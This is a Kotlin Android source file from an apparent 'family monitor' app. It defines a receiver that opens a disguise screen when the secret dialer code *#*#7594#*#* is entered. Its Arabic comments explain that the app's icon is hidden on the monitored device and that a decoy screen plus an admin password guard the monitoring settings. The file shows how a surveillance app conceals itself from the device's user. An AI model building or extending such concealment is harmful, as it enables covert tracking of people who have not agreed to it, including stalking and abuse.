package com.family.monitor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/**
 * استقبال الكود السري من لوحة الاتصال:
 * بعد إخفاء أيقونة التطبيق على الجهاز الفرعي، يكتب المستخدم (الأدمن) في
 * لوحة الاتصال:  *#*#7594#*#*
 * فيفتح النظام هذا المستقبل تلقائيًا → نعرض شاشة التمويه
 * (زر ← كلمة مرور الأدمن ← إعدادات المراقبة).
 *
 * الكود لا يعمل إلا إذا كانت الأيقونة مخفية أو ظاهرة — لا يضر بأي شيء آخر،
 * ولا يظهر أي شيء لأي شخص غير معرف بالكود (شاشة التمويه بريئة تمامًا،
 * والإعدادات لا تُفتح إلا بكلمة مرور الأدمن).
 */
class SecretCodeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SECRET_CODE") return
        try {
            val i = Intent(context, DisguiseActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            context.startActivity(i)
        } catch (_: Exception) {
        }
    }
}
